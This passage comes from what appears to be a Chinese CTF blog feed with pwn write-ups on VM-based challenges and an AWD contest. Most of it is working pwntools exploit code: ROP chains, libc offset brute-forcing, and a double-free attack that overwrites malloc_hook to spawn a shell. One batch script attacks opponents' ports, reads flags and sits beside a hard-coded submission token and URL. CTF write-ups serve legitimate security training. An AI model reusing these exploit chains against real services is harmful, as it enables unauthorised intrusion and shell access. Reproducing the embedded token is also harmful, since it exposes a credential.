class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">'./boom1'</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'''</span></span><br><span class="line"><span class="string">int buf ;</span></span><br><span class="line"><span class="string">int main() &#123;</span></span><br><span class="line"><span class="string">    int a;</span></span><br><span class="line"><span class="string">    int ptr;</span></span><br><span class="line"><span class="string">    int libc_base;</span></span><br><span class="line"><span class="string">    ptr = &amp;buf;</span></span><br><span class="line"><span class="string">    libc_base = ptr - 0x503010;</span></span><br><span class="line"><span class="string">    ptr = libc_base + 0x5f0f48;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    read(0,ptr,3);</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recv(timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.recv(timeout=<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">r.send(<span class="string">'\x47\xe1\xAf'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = int(r.recvline(),16)</span></span><br><span class="line"><span class="comment"># print "libc: " + hex(libc)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="1-2-libc位置情况下的偏移爆破"><a href="#1-2-libc位置情况下的偏移爆破" class="headerlink" title="1.2 libc位置情况下的偏移爆破"></a>1.2 libc位置情况下的偏移爆破</h3><p>由于libc版本未知，远程偏移未知，所以需要爆破偏移,从-99到99爆破，从网上找到了别人爆破的脚本，学到了新的知识。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">-99</span>, <span class="number">99</span>):</span><br><span class="line">        ············</span><br><span class="line">        libc.address = leaked - <span class="number">0x612500</span> - <span class="number">0x1000</span> * x</span><br><span class="line">        success(<span class="string">"libc -&gt; &#123;:#x&#125;"</span>.format(libc.address))</span><br><span class="line">        ···········</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io.recv()</span><br><span class="line">            io.sendline(<span class="string">"ls"</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> io.recv():</span><br><span class="line">                io.interactive()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                io.close()</span><br><span class="line">                io = remote(<span class="string">"node3.buuoj.cn"</span>, <span class="number">27119</span>)</span><br><span class="line">                <span class="comment"># io = process("./hardcore_fmt")</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            io.close()</span><br><span class="line">            <span class="comment"># io = process("./hardcore_fmt")</span></span><br><span class="line">            io = remote(<span class="string">"node3.buuoj.cn"</span>, <span class="number">27119</span>)</span><br></pre></td></tr></table></figure><h2 id="0x2-boom2"><a href="#0x2-boom2" class="headerlink" title="0x2 boom2"></a>0x2 boom2</h2><h3 id="2-1-分析题目"><a href="#2-1-分析题目" class="headerlink" title="2.1 分析题目"></a>2.1 分析题目</h3><p>首先用malloc分配了两块内存，分析后得出一块是栈，代码段，分析前面这块的行为，它把真实的栈地址push到了虚拟的栈中，这里是突破的一个关键点，提供了我们突破虚拟机的限制来与虚拟内存之外进行交互。</p><p><img src="/12/ckur473f00059ab150l8clubp/1.png" alt></p><p>然后看下图，我们输入的内容是进入到buf中的，也就是代码段，然后程序对我们的输入进行取址，译码。</p><p>再下一步就是根据取到的指令进行执行</p><p><img src="/12/ckur473f00059ab150l8clubp/2.png" alt></p><p>经过分析以后可知,各操作数对应的指令为(带imm的指令就是有一个原操作数是立即数)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> imm: temp = ebp_now + imm</span><br><span class="line"><span class="number">1</span> imm: temp = imm;</span><br><span class="line"><span class="number">6</span> imm: push ebp_now; ebp_now = esp_now; esp_now -= imm;</span><br><span class="line"><span class="number">8</span> : leave; ret;</span><br><span class="line"><span class="number">9</span> : temp = *(qword*)temp </span><br><span class="line"><span class="number">10</span> : temp = *(<span class="keyword">char</span>*)temp</span><br><span class="line"><span class="number">11</span> : **esp_now = temp; ++esp_now;   <span class="number">8b</span>yte</span><br><span class="line"><span class="number">12</span> : **esp_now = temp; ++esp_now;   <span class="number">1b</span>yte</span><br><span class="line"><span class="number">13</span> : push temp</span><br><span class="line"><span class="number">14</span> : temp |= *esp now; pop;</span><br><span class="line"><span class="number">15</span> : temp ^= *esp now; pop;</span><br><span class="line"><span class="number">16</span> : temp &amp;= *esp now; pop;</span><br><span class="line"><span class="number">17</span> : temp = temp == *esp now; pop;</span><br><span class="line"><span class="number">18</span> :       != </span><br><span class="line"><span class="number">19</span> :        &lt;</span><br><span class="line"><span class="number">20</span> :        &gt;</span><br><span class="line"><span class="number">21</span> :        &lt;=</span><br><span class="line"><span class="number">22</span> :        &gt;=</span><br><span class="line"><span class="number">23</span> :        &lt;&lt;</span><br><span class="line"><span class="number">24</span> :        &gt;&gt;</span><br><span class="line"><span class="number">25</span> :         +</span><br><span class="line"><span class="number">26</span> :  temp = *esp_now - temp;</span><br><span class="line"><span class="number">27</span> :         *</span><br><span class="line"><span class="number">28</span> :          /</span><br><span class="line"><span class="number">29</span> :         %</span><br><span class="line"><span class="number">30</span> :  <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><h3 id="2-2-解题思路"><a href="#2-2-解题思路" class="headerlink" title="2.2 解题思路"></a>2.2 解题思路</h3><ol><li>先用14指令pop一下，这个时候temp中存的就是真实的栈指针了</li><li>再利用1指令和26计算出返回地址的位置，13来把计算结果存到栈上</li><li>用9指令获取返回地址里的内容（libc_start_main+231)，然后再用13保存到栈上</li><li>利用1和26计算libc基址，然后再用13保存到栈上</li><li>利用1和25计算onegadget的偏移</li><li>最后利用11把onegadget写入返回地址</li></ol><h3 id="2-3-exp"><a href="#2-3-exp" class="headerlink" title="2.3 exp"></a>2.3 exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">p=process(<span class="string">"./pwn"</span>)</span><br><span class="line"></span><br><span class="line">libc231=<span class="number">0x7f9848c0cb97</span><span class="number">-0x7f9848beb000</span></span><br><span class="line">onegadget=<span class="number">0x4f2c5</span></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">14</span>)  <span class="comment">#步骤1</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)+p64(<span class="number">0xe8</span>)+p64(<span class="number">26</span>)+p64(<span class="number">13</span>) <span class="comment">#步骤2</span></span><br><span class="line">payload+=p64(<span class="number">9</span>)+p64(<span class="number">13</span>)   <span class="comment">#步骤3</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)+p64(libc231)+p64(<span class="number">26</span>)+p64(<span class="number">13</span>) <span class="comment">#步骤4</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)+p64(onegadget)+p64(<span class="number">25</span>) <span class="comment">#步骤5</span></span><br><span class="line">payload+=p64(<span class="number">11</span>) <span class="comment">#步骤6</span></span><br><span class="line">p.send(payload) <span class="comment">#步骤7</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x3-faster0"><a href="#0x3-faster0" class="headerlink" title="0x3 faster0"></a>0x3 faster0</h2><p>这个题，乍一看要做一百次选择，然后最后进入func100，有一个很简单的栈溢出，最笨的方法就是一个一个把100个都过了，也可以。但感觉会有更简单的方法，比如是不是能让atoi返回大于10的数，然后一直走func000，然后再直接跳到func095,不过自己没有实现。放一个学弟写的脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line">sh = process(<span class="string">'./faster0'</span>)</span><br><span class="line">num = <span class="string">'''</span></span><br><span class="line"><span class="string">4 9 4 9 6 0 3 4 1 6</span></span><br><span class="line"><span class="string">5 9 1 9 3 2 2 2 0 0</span></span><br><span class="line"><span class="string">9 6 9 9 1 4 8 9 4 6</span></span><br><span class="line"><span class="string">1 5 7 5 0 3 5 6 5 8</span></span><br><span class="line"><span class="string">3 6 2 6 5 5 7 3 2 8</span></span><br><span class="line"><span class="string">4 4 4 7 7 5 2 1 6 7</span></span><br><span class="line"><span class="string">0 3 4 8 6 0 0 3 1 1</span></span><br><span class="line"><span class="string">0 7 8 2 7 1 9 5 6 9</span></span><br><span class="line"><span class="string">9 3 4 7 7 5 3 7 2 3</span></span><br><span class="line"><span class="string">8 7 2 5 2 2 6 6 6 3</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">rdi_ret = <span class="number">0x0000000000406013</span></span><br><span class="line">rsi_r15_ret = <span class="number">0x0000000000406011</span></span><br><span class="line">write_got = <span class="number">0x609018</span></span><br><span class="line">write_plt = <span class="number">0x400640</span></span><br><span class="line">start_addr = <span class="number">0x4006c0</span></span><br><span class="line">num = num.replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">num = num.replace(<span class="string">'\n'</span>,<span class="string">''</span>)</span><br><span class="line">sh.sendline(num)</span><br><span class="line">sh.recvuntil(<span class="string">'WOW,U R GREAT !\n'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0xd8</span> + p64(rdi_ret) + p64(<span class="number">1</span>) + p64(rsi_r15_ret) + p64(write_got) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(write_plt) + p64()</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x0-前言&quot;&gt;&lt;a href=&quot;#0x0-前言&quot; class=&quot;headerlink&quot; title=&quot;0x0 前言&quot;&gt;&lt;/a&gt;0x0 前言&lt;/h2&gt;&lt;p&gt;这次的pwn基本上都是vm pwn，虚拟指令集，这类题代码量大，需要逆向时间长。但做这类题的关键点在于找到虚拟机中和真实环境的交互点，找到可以泄露真实地址的方式之后这种题基本就稳了。&lt;/p&gt;
    
    </summary>
    
      <category term="pwn题writeup" scheme="wood1314.github.io/categories/pwn%E9%A2%98writeup/"/>
    
    
      <category term="vm" scheme="wood1314.github.io/tags/vm/"/>
    
  </entry>
  
  <entry>
    <title>awd 通打pwn脚本记录一波</title>
    <link href="wood1314.github.io/year/04/26/ckur473dp0011ab15dykoastf/"/>
    <id>wood1314.github.io/year/04/26/ckur473dp0011ab15dykoastf/</id>
    <published>2020-04-26T09:22:38.000Z</published>
    <updated>2020-05-24T01:32:14.307Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>第一次线上awd，交flag是交的真的爽，也算是对awd的流程有所熟悉了。题目不难，但是深感自己写脚本速度还是不够快。</p><a id="more"></a><h2 id="0x1-第一题"><a href="#0x1-第一题" class="headerlink" title="0x1 第一题"></a>0x1 第一题</h2><p>double_free,然后改就是把free函数给弄没了。。。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'index&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(<span class="string">'size&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">'name&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line">    sh.recvuntil(<span class="string">'Your Choice\n'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'index&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(<span class="string">'Your Choice\n'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'index&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(<span class="string">'name&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'5'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'index&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    content = sh.recv(<span class="number">6</span>)</span><br><span class="line">   <span class="comment"># log.info(content)</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your Choice\n'</span>)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line">ip = <span class="string">"39.100.119.37"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_shell</span><span class="params">(ip, port)</span>:</span></span><br><span class="line">sh = remote(ip, port)</span><br><span class="line">sh.recvuntil(<span class="string">'Your Choice\n'</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x100</span>,<span class="string">'a'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">'b'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x30</span>,<span class="string">'ss'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(show(<span class="number">0</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">log.success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">one_gadget = libc_base + <span class="number">0xf02a4</span></span><br><span class="line">malloc_hook = libc_base + <span class="number">0x3c4b10</span></span><br><span class="line">fake_fast = malloc_hook - <span class="number">0x13</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>,<span class="string">'c'</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>,p64(fake_fast))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>,<span class="string">'z'</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>,<span class="string">'ss'</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>,<span class="string">'a'</span> * <span class="number">0x3</span> + p64(one_gadget))</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'index&gt;&gt; '</span>)</span><br><span class="line">sh.sendline(str(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> sh</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(ip, port)</span>:</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r = get_shell(ip, port)</span><br><span class="line">r.sendline(<span class="string">"cat flag\n"</span>)</span><br><span class="line"><span class="keyword">print</span> r.recv(<span class="number">100</span>)</span><br><span class="line">r.close()</span><br><span class="line"><span class="keyword">except</span> KeyError <span class="keyword">as</span> e:</span><br><span class="line">print(<span class="string">'KeyError'</span>)</span><br><span class="line"><span class="keyword">except</span> IndexError <span class="keyword">as</span> e:</span><br><span class="line">print(<span class="string">'IndexError'</span>)</span><br><span class="line"><span class="keyword">except</span> TypeError <span class="keyword">as</span> e:</span><br><span class="line">print(<span class="string">'TypeError'</span>)</span><br><span class="line"><span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">print(<span class="string">'ValueError'</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">print(<span class="string">'Exception'</span>)</span><br><span class="line"></span><br><span class="line">port = <span class="number">41080</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">get_flag(ip, port + i * <span class="number">100</span>)</span><br></pre></td></tr></table></figure><h2 id="0x2-第二题"><a href="#0x2-第二题" class="headerlink" title="0x2 第二题"></a>0x2 第二题</h2><p>还是个double_free,同样把free给改没了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">token = <span class="string">"7hQvn3AnHrtjaFmFN2MxztbCM4hGRQECZKEvJzu2dtSfU"</span></span><br><span class="line">url = <span class="string">"http://10.66.20.15/api/v1/jad/web/submit_flag/?event_id=2"</span></span><br><span class="line"></span><br><span class="line">ips=[]</span><br><span class="line"></span><br><span class="line">context.timeout = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'index&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(<span class="string">'size&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">'name&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line">    sh.recvuntil(<span class="string">'Your Choice\n'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'index&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(<span class="string">'Your Choice\n'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'index&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(<span class="string">'name&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'5'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'index&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    content = sh.recv(<span class="number">6</span>)</span><br><span class="line">   <span class="comment"># log.info(content)</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your Choice\n'</span>)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,<span class="number">30</span>):</span><br><span class="line">ips.append(<span class="string">"4"</span> + str(i + <span class="number">2</span>).rjust(<span class="number">2</span>,<span class="string">'0'</span>) + <span class="string">"80"</span>)</span><br><span class="line"><span class="comment"># print ips</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_shell</span><span class="params">(ip)</span>:</span></span><br><span class="line"><span class="keyword">global</span> sh</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'39.100.119.37'</span>, int(ip,<span class="number">10</span>))</span><br><span class="line">sh.recvuntil(<span class="string">'Your Choice\n'</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x100</span>,<span class="string">'a'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">'b'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x30</span>,<span class="string">'ss'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(show(<span class="number">0</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">log.success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">one_gadget = libc_base + <span class="number">0xf02a4</span></span><br><span class="line">malloc_hook = libc_base + <span class="number">0x3c4b10</span></span><br><span class="line">fake_fast = malloc_hook - <span class="number">0x13</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>,<span class="string">'c'</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>,p64(fake_fast))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>,<span class="string">'z'</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>,<span class="string">'ss'</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>,<span class="string">'a'</span> * <span class="number">0x3</span> + p64(one_gadget))</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line"><span class="keyword">return</span> sh</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(ip)</span>:</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">sh = get_shell(ip)</span><br><span class="line"><span class="comment">#sh.interactive()</span></span><br><span class="line">sh.sendline(<span class="string">'cat ?l?g'</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sh.sendline(<span class="string">'cat 